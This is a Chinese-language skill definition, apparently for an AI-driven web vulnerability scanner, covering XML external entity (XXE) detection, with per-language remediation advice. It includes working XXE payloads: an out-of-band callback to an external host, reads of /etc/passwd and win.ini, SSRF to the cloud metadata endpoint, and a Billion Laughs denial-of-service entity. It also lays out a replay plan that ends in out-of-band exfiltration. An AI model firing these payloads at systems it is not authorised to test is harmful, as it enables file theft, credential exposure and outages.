---
name: 'XXE XML 外部实体分析'
icon: '📄'
description: '当请求体是 XML 格式且 Content-Type 为 application/xml / text/xml / application/soap+xml / application/xhtml+xml，或请求含 SVG / DOCX / XLSX / PPTX 上传 / SOAP 端点 / RSS 解析时启用。典型信号：Content-Type 是 application/xml、body 开头是 <?xml version="1.0"?>、URL 在 SOAP 服务（/ws / WebService / WSDL）/ 文件预览 / 文档解析 / Office 文件上传 / SVG 上传 / RSS 抓取 / SAML 断言接收。不适用：纯 JSON 接口（即便 body 是 XML 也只是字符串不会解析）、纯 HTML 页面、无 XML 解析场景。'
findingType: 'xxe'
---

本技能专注于 XML 外部实体注入（XXE）——XML 解析器在解析请求时支持外部实体，导致读本地文件 / SSRF / 拒绝服务 / RCE（极少数如 Java XInclude）。在你识别到 XML 解析入口时，按以下流程处理：
1. 识别 XML 解析入口：Content-Type=application/xml 的 POST、SOAP WebService 端点、Office 文件上传（DOCX/XLSX/PPTX 是 ZIP+XML 容器）、SVG 上传（SVG 内部有 XML 头）、SAML 断言消费端、RSS 解析、XML-RPC。
2. 给出探测 payload（先用无害的探测，再上 file://）：
   - 判活（外部实体是否被解析）：<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://oastify.com/test">]><root>&xxe;</root>
   - 读本地文件：<!ENTITY xxe SYSTEM "file:///etc/passwd"> 或 file:///c:/windows/win.ini
   - SSRF：<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
   - 拒绝服务（Billion Laughs）：<!ENTITY a "AAAA..."> × 10 嵌套（小心，可能挂目标）
3. 给出修复建议（按语言）：
   - Java：禁用外部实体：DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)；或用 JAXB / Jackson XmlMapper；
   - PHP：libxml_disable_entity_loader(true)（PHP 8 已默认禁）；
   - Python：lxml 用 defusedxml 替代；xml.etree 默认安全；
   - .NET：XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit；
   - Node：libxmljs 用 noent=false。
4. 进阶：DOCX/XLSX/PPTX/SVG 上传场景，文件本身是 ZIP+XML，文件上传模块也要修。
所有由本技能产出的 finding 必须设置 type=xxe。多个技能可能同时被激活，本技能不负责 SSRF（XXE 的 SSRF 走 file:// 协议仍属本技能，http:// SSRF 视角归 ssrf 技能）/ XSS（SVG 里的 script 是 XSS 视角）/ 文件上传（DOCX 内 XXE + 上传绕过可双技能并发）/ 反序列化（XMLEncoder 不是 XXE）等类型的发现。
【重放建议】XXE 验证极快，3 次硬上限（orchestrator 管控）按：
- 第 1 次：判活（OOB 回调或无 payload 看响应体是否变化）；
- 第 2 次：读 /etc/passwd 或 c:/windows/win.ini，看回显（回显型 XXE）或写文件后另一条读（盲打）；
- 第 3 次：精调 payload 路径（无回显要换 OOB 或 out-of-band exfil）。
SVG 上传场景：先在 SVG 头 <?xml version="1.0"?> 后塞 DOCTYPE 声明，跑同一套探测。
OOB 命中 / 响应里看到 root:x:0:0:... / meta-data 内容，可直接给 high/critical。本技能是"分析建议"而非"硬性规则"，最终判断权交给模型。
- 【反误报】给 finding 设 confidence 时，只在能解释清楚"为什么 ≥ 60" 时给 ≥60；判不成立 / 仅残留小概率不确定性（如 5%–20%）的疑似不要写进 findings——本插件解析阶段会再过一道阈值（约 30）兜底，但 prompt 层的克制才是从源头减少问题列表噪声 finding 的关键。
